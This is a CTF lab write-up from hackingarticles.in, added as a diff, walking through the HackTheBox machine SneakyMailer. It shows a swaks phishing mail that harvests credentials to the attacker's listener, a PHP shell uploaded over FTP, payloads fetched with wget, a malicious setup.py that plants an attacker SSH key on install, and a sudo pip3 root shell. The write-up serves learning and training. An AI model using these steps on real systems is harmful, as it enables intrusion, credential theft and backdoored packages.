@@ -1,0 +1,215 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">SneakyMailer HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/sneakymailer-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-02-24T09:40:44+00:00">February 24, 2021</time><time class="updated" datetime="2025-06-22T12:02:49+00:00">June 22, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack a machine called SneakyMailer. It was created by <span style="color: #0000ff;"><strong>sulcud</strong></span>. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating HTTP Service</span></li>
+<li><span style="color: #000000;">Enumerating Email Addresses</span></li>
+<li><span style="color: #000000;">Extracting Email Addresses using CeWL</span></li>
+<li><span style="color: #000000;">Send Phishing Mail using swaks</span></li>
+<li><span style="color: #000000;">Extracting Credentials</span></li>
+<li><span style="color: #000000;">Decoding URL Encoded Password</span></li>
+<li><span style="color: #000000;">Setting Up Email Client</span></li>
+<li><span style="color: #000000;">Enumerating Emails</span></li>
+<li><span style="color: #000000;">Gathering Credentials form Email</span></li>
+<li><span style="color: #000000;">Login into FTP Service</span></li>
+<li><span style="color: #000000;">Enumerating FTP Service</span></li>
+<li><span style="color: #000000;">Uploading Shell on FTP</span></li>
+<li><span style="color: #000000;">Enumerating dev Virtual Host</span></li>
+<li><span style="color: #000000;">Getting Shell as www-data</span></li>
+<li><span style="color: #000000;">Enumerating the credentials for pypi</span></li>
+<li><span style="color: #000000;">Cracking password for pypi using John the Ripper</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Creating SSH keys</span></li>
+<li><span style="color: #000000;">Crafting Malicious Package Files</span></li>
+<li><span style="color: #000000;">Transferring Malicious Package</span></li>
+<li><span style="color: #000000;">Logging in as Low User</span></li>
+<li><span style="color: #000000;">Reading User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating Sudo Permissions</span></li>
+<li><span style="color: #000000;">Exploiting pip3 to root</span></li>
+<li><span style="color: #000000;">Reading the Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
+<p><span style="color: #000000;"><strong>IP Address assigned: 10.129.2.28</strong></span></p>
+<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.129.2.28</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cnHwWfzf61I/YDYZx6IUANI/AAAAAAAAuDM/9GW4tZtfyYEpcEou6vdwxmYlhsqVjzbmACLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that the following ports and services are running: FTP (21), SSH (22), SMTP (25), HTTP (80), IMAP (143,993), HTTP Proxy (8080).</span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">We can take clues form the nmap scan and the name of the machine that this will be based on emails and email clients. We tried to enumerate FTP service but Anonymous Login was not allowed and we didn’t had credentials for it yet. Also, we skipped SSH because we didn’t have credentials for it. Since there was an HTTP service on port 80, we tried to browse it but were unsuccessful. Hence, we might have to make an entry inside the /etc/hosts file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/hosts
+10.129.2.28 sneakycorp.htb</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AELXUCAJ3bs/YDYZ35E5CTI/AAAAAAAAuDQ/mOLc2qcIj7crjq4EnieLL_8mR0DyYTGagCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">Then, we try to browse the application or the HTTP service on port 80. It is a dashboard of some sort for the Sneaky Corporation.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://sneakycorp.htb</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6awi36bSxC0/YDYZ8H__7vI/AAAAAAAAuDU/MkonPqchjLcVr-67ZTicobOVTxJsYvWYgCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">We found a Team link on the home page that takes us to the team.php. This page contains a list of email ids all belonging to the employees of SneakyCorp.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://sneakycorp.htb/team.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tk7l5P7mfhs/YDYaAir8y2I/AAAAAAAAuDY/ndOv1PVpn1ATL-z29k_jIMkTIfxCdD9agCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">We use the cewl tool to extract all the mails found on the team page and put them inside a text file named emails.txt</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cewl -e --email_file emails.txt http://sneakycorp.htb/team.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-liNnmY0OvVA/YDYaG8P7TmI/AAAAAAAAuDc/aeiMxKGgJbQ0VSPHeq3bktEVs21ym0kKwCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">Here we can see that CeWL extracted all the emails.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat emails.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fQMbKzdm29M/YDYaLKz6f8I/AAAAAAAAuDk/cmRSZpYd-4YEloeEvkpV2_wgQcHBvdvrwCLcBGAsYHQ/s16000/6.png"/></span></p>
+<h4><span style="color: #000000;">Phishing Campaign Execution</span></h4>
+<p><span style="color: #000000;">After enumerating for hours and performing various kinds of brute forces, we were lost. At that time, we thought maybe what we really need to do here with the mails is to send phishing mails to them. We thought of one of the best tools in this trade swaks. But it will take a lot of time to send mails on each mail id if we do it manually. We decided to automate this task using a simple loop. We use the cat command inside the to the parameter of swaks. </span></p>
+<p><span style="color: #000000;">The cat command will read the emails and tr will add comma at the end of emails and we will be able to send mail to all the emails we extracted form the team page. But it’s not a phishing mail if it doesn’t contain any link. We will enter our own IP Address so as to receive any requests that might be generated if that email is read. We can start a netcat on our local machine as well to capture if any request is generated.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">swaks --to $(cat emails.txt | tr '\n' ',') --from raj@sneakymailer.htb --header "Subject: HackingArticles" --body "Visit HackingArticles http://10.10.14.64/" --server 10.129.2.28</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VSi3FK_a3a8/YDYaRV3n57I/AAAAAAAAuDs/HBXKy5RRD44S7XuY38awgrFtKfyqdeiuwCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">After we run swaks, we check our netcat listener and it captured something. It is a POST request containing the Account Information of the User Paul Byrd.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-POZRYRsUVj8/YDYaZf-xXMI/AAAAAAAAuDw/_EeGc5rZ_7Q_af0f4TnppDR_nfU9XNwmACLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">The Password was URL Encoded. We used asciitohex website to decode the password.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
+^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gCpC2C-MbUo/YDYajWTK3bI/AAAAAAAAuD4/4Dc_K1k9BmEPHYemkazuTkedk_mnTbYIwCLcBGAsYHQ/s16000/9.png"/></span></p>
+<h4><span style="color: #000000;">Privilege Escalation Path</span></h4>
+<p><span style="color: #000000;">Now that we have all the information for the user Paul Byrd, we can set up his mail on an email client to browse his emails.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">paulbyrd@sneakymailer.htb
+IMAP
+sneakycorp.htb
+paulbyrd
+^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MrpR4fQa1jg/YDYapRk1utI/AAAAAAAAuEA/3k5vbyFOQqM69Lqr6fyAoN8dDQeUQf87gCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">We find 2 emails. Let’s read the first one. It is addressed to a user by the name Low. It says that Low has to install, test and then erase every python module found in the Corporation’s PyPI service. This might be a hint for the things to come.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BUgDmNWB6pQ/YDYavemr73I/AAAAAAAAuEE/lIAj-848xgUKo_BPMYLqZUCJY2MrnpRAQCLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">The next Email contains straight-up credentials for a user by the name of the developer.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Username: developer
+Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Vb0tUjIZZ4s/YDYaz6lkGmI/AAAAAAAAuEM/02wL93wKjKc5vqBX0BB6uJuczjPUHlKqQCLcBGAsYHQ/s16000/12.png"/></span></p>
+<h4><span style="color: #000000;">FTP Access and Web Shell Deployment</span></h4>
+<p><span style="color: #000000;">We note the credentials for the user developer and try those in the FTP service and we were allowed to login.</span></p>
+<p><span style="color: #000000;">We found a dev directory and it contains an index.php. This means this is an alternative website. This might be a virtual host of the original hostname.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 10.129.2.28
+cd dev</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XWPq7cs5oM0/YDYbCJjA-kI/AAAAAAAAuEY/yffMLfIXQusKdyeH09rMMRdaUMXEAEfuQCLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">We try to upload a shell through FTP using the PUT command. The shell gets uploaded with ease. Time to locate it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">put shell.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5CKePzgqOxU/YDYbKrf61sI/AAAAAAAAuEg/ebmDIVZWEUIfvNuHvKa4wtqcPONeCx90ACLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">We try to locate it on the application but we are unable to. Then we went back to our thought that dev might be a virtual host of the application. So, we make an entry in the /etc/hosts file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/hosts
+10.129.2.28 sneakycorp.htb dev.sneakycorp.htb</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-y32_10YIYDc/YDYbTY0EZkI/AAAAAAAAuEo/b77W8Ay4qIIDryW-Y1McAMIOchuL7xqTwCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">We again try to locate the payload. This time we are successful into triggering the payload.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://dev.sneakycorp.htb/shell.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pVduS1XhXvw/YDYbYVLiAlI/AAAAAAAAuEs/Kk-SsfW0RMEDMldIEuS4n5g0rJYVkGjygCLcBGAsYHQ/s16000/18.png"/></span></p>
+<h4><span style="color: #000000;">Privilege Escalation to Low User</span></h4>
+<p><span style="color: #000000;">We started a netcat listener on the port mentioned on the payload. When the payload is executed, we found a shell of the user www-data. We upgrade the shell to TTY shell. Then we started to enumerate around the different directories. Then, we ended up inside the /var/www/ directory. We find a pypi.sneakycorp.htb directory. This means there is a third virtual host on this machine. We enter the directory to find a .htpasswd file. We read it; it contained the encrypted password of the pypi user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234
+python -c 'import pty;pty.spawn("/bin/bash")'
+pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ahoq24I2ZwY/YDYbewaIe0I/AAAAAAAAuE0/iRvvGi_3xckkgIfbYSXawUPN3r0jAk_jgCLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">Now that we have found another virtual host, let’s make another entry in the /etc/hosts/</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/hosts
+10.129.2.28 sneakycorp.htb dev.sneakycorp.htb pypi.sneakycorp.htb</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eGzZbT2wiHo/YDYbjUmi-9I/AAAAAAAAuE8/9mOD_L6KDQAf6KQStBnChIfRVn-HjKs8wCLcBGAsYHQ/s16000/20.png"/></span></p>
+<p><span style="color: #000000;">Back to the encrypted password that we got for the pypi user. We use the john the ripper to decrypt it. We get the password as ‘soufianeelhaoui’</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john -w=/usr/share/wordlists/rockyou.txt hash
+soufianeelhaoui</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--kT5PUyLEzI/YDYbo6nb7WI/AAAAAAAAuFE/5AqUof52mggvyQl690CcN95nCVldoo-6ACLcBGAsYHQ/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">Then, we open the newly added virtual host on the browser. It gets redirected to the proxy on port 8080.</span></p>
+<p><span style="color: #000000;">Here we see that it is shown that the application is running pypi version 1.3.2.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://pypi.sneakycorp.htb:8080</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Z-BzMLrIuRQ/YDYbs1400FI/AAAAAAAAuFI/e2JEUfkhmXQHvjOz_Tc0lKhN5P60q-W7gCLcBGAsYHQ/s16000/22.png"/></span></p>
+<p><span style="color: #000000;">Back to our shell, we login into the developer user. We try to locate the user flag. Which, we found it inside the low user’s directory. We found the user low in the mails as well. Then, we try to read the user flag but it is not readable. We need to get the shell as the user Low.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">su developer
+m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+cd /home/
+cd low
+cat user.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cOwKksMf6Cc/YDYbxtolXQI/AAAAAAAAuFQ/SMPZFgw7T9wec4nmLClZpEItZbpiqY4wACLcBGAsYHQ/s16000/23.1.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">After many enumerations, we concluded that we need to install python packages and get low user access from them. We decided to replace the ssh key for the user low. To do that we need to first create one.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh-keygen
+cd .ssh
+cat id_rsa.pub &gt; authorized_keys
+cat authorized_keys</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gRa3K99hG74/YDYb2qdHRII/AAAAAAAAuFU/F-QQXsPfDOY3igRhV6mhF3uTrjGjwSnbQCLcBGAsYHQ/s16000/23.png"/></span></p>
+<p><span style="color: #000000;">Now for the difficult part. We will create a malicious python package that will replace the ssh key for the user Low. We will need to create a folder for our package. Then create a setup.py file and a pyirc file. There is other file that are the contents of a package but those are not absolutely necessary. We will skip those files. We created the both files. First, we added the credentials that we found for pypi user into the pyirc file. Next, we will be adding the ssh key into the setup.py file.</span></p>
+<p><span style="color: #000000;">Note: Python is based on indentions. So, make sure it is in the correct order so that it can execute without any runtime error.</span></p>
+<p><span style="color: #000000;">After creating both files, we sent the files to the target machine.</span></p>
+<h5><strong><span style="color: #000000;">.pypirc File</span></strong></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">[distutils]
+index-servers = local
+[local]
+repository: http://pypi.sneakycorp.htb:8080
+username: pypi
+password: soufianeelhaoui</pre>
+<h5><strong><span style="color: #000000;">setup.py File</span></strong></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">import setuptools
+try:
+   with open("/home/low/.ssh/authorized_keys", "a") as f:
+        f.write("\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDbFK8gFqf8iZf8MF6zFcA7tnpG/RUwnB0urEPPj/zoqY1nOCODeS8VNS+MGI8ekIUk/pROFRbaeJDYLIyXj1xW0qOS74Njmwi2ERlIkaM+9GKsXXHXUjyz2ZuXbwsalEfg8w3A7uY6M4rzhFwnrayuAJUmcKh+Pk695Y5F5uodwTPn1q1ijm6KQWHD5XuPgiziEbojL5YMBwnjStb/Nj92GwVXzWZ5FXAAhsmezvqvCfIHUS+OwhmsYRt4MBKUNXfPulgbTy5TMB3m0Uh/cT51n8DU6kgPfXvngCJhgEQVtfXCio6mSvDO+H4Q7i79GD716Mbac+d1bsBZbmrJuZoItIIRwOIuBShxOnB3wA2U59XbI4jU2NB3J8/K+mkqkuQB52D//G9chKKW1qB11WaKhQLk9jp9D0NWgdom2Qqs9zfWdnKIKnN5xUAezwEPnRRYRYZ2R7d1lOwI68XzLjASzRlA2/TLpCOJFrMlINK9wKdZ/obtJgkI619Dh2aBeuc= root@kali")
+        f.close()
+except Exception as e:
+   pass
+setuptools.setup(
+name="example-pkg3", # Replace with your own username
+version="0.0.1",
+author="Example Author",
+author_email="author@example.com",
+description="A small example package",
+long_description="",
+long_description_content_type="text/markdown",
+url="https://github.com/pypa/sampleproject",
+packages=setuptools.find_packages(),
+classifiers=[
+"Programming Language :: Python :: 3",
+"License :: OSI Approved :: MIT License",
+"Operating System :: OS Independent",
+],
+)</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-u0P7hKgQKzY/YDYcCU98x1I/AAAAAAAAuFg/Kl1cKS6-WU0vNEqnrdlKXoWj2jE1RU8VgCLcBGAsYHQ/s16000/24.png"/></span></p>
+<p><span style="color: #000000;">On the target machine, move to the tmp directory and create a directory for your package files. Download both the files using wget command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
+mkdir japneet
+wget 10.10.14.64/setup.py
+wget 10.10.14.64/.pypirc</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xPCJSHj3aH8/YDYcIrNmvgI/AAAAAAAAuFo/cUyMZMNIe2YGmbGzFMhY8jtMIUamjEILwCLcBGAsYHQ/s16000/49.png"/></span></p>
+<p><span style="color: #000000;">Then, since we need to execute the command, we first need the path to be added into the Environment Variable. The at last we will convert the independent files into package.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">HOME=$(pwd)
+python3 setup.py sdist register -r local upload -r local</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HLkatwZ2iiU/YDYcQkOzR-I/AAAAAAAAuFs/lIfMEJ-T1FkZ2nmpuO3bEiLqzCeZuxg_QCLcBGAsYHQ/s16000/50.png"/></span></p>
+<p><span style="color: #000000;">Now we use the authorized key that we created and made an entry into the target machine to get the session of the user low.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 600 id_rsa
+ssh -i id_rsa low@10.129.2.28
+sudo -local</pre>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">After getting a session as Low. We can read the user flag but we decided to first focus on the getting root. To do this we enumerated the sudo permissions. We found that low can run pip3 without a password. So, we proceeded to add a shell invocation command into the setup.py file we just used. Then we used pip3 to run it because we install packages on the system with pip3. As soon as we install the package, we get the shell as root. </span></p>
+<p><span style="color: #000000;"><strong>Source</strong>:<span style="color: #0000ff;"><strong> https://gtfobins.github.io/gtfobins/pip/</strong></span></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')" &gt; $TF/setup.py
+sudo pip3 install $TF
+cd /root
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SHpFxrjsBTc/YDYcWOyguLI/AAAAAAAAuF0/D66lelRxogoqnFyxRBj1CReRGQ6wpoiCwCLcBGAsYHQ/s16000/52.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
